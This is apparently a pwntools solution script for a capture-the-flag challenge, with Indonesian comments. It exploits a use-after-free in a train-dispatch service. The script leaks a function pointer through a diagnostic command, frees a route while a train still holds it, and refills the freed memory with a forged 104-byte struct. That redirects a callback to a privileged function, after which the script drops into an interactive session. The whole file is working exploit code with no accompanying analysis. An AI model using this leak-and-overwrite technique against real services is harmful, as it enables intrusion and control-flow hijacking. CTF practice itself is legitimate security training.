from pwn import *
import subprocess, re, struct

HOST = "tcp-01kz0x02a8qqc060ym9377c9g6.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

# Ambil delta lokal: dispatch_override - normal_departure
nm = subprocess.check_output(["nm", "-an", "./chall"]).decode()
addr = {}
for line in nm.splitlines():
    if " dispatch_override" in line:
        addr["dispatch_override"] = int(line.split()[0], 16)
    if " normal_departure" in line:
        addr["normal_departure"] = int(line.split()[0], 16)

delta = addr["dispatch_override"] - addr["normal_departure"]
log.info(f"delta dispatch_override - normal_departure = {delta:#x}")

io = remote(HOST, PORT, ssl=True, sni=True)

def cmd(x):
    io.sendlineafter(b"dispatch> ", x if isinstance(x, bytes) else x.encode())

# 1. Buat route asli
cmd("new 0 2 R0")

# 2. Assign train ke route
cmd("assign 0 0")

# 3. Leak normal_departure lewat diag
cmd("diag 0")
io.recvuntil(b"depart callback @ ")
leak = int(io.recvline().strip(), 16)
override = leak + delta
log.success(f"normal_departure leak = {leak:#x}")
log.success(f"dispatch_override = {override:#x}")

# 4. Cancel route: train masih pegang pointer lama, cleanup akan free saat tick berikutnya
cmd("cancel 0")

# 5. Queue fake Route lewat bulletin
fake  = b"PWN\x00".ljust(24, b"\x00")          # code[24]
fake += b"fake manifest".ljust(64, b"\x00")   # manifest[64]
fake += p64(override)                         # depart_cb
fake += p32(1)                                # depart_tick <= tick 1
fake += p32(0)                                # cancelled

assert len(fake) == 104

cmd("bulletin")
io.sendlineafter(b"hex chars): ", fake.hex().encode())

# 6. advance: maintenance free -> bulletin malloc reuse -> departure call override
cmd("advance")

io.interactive()
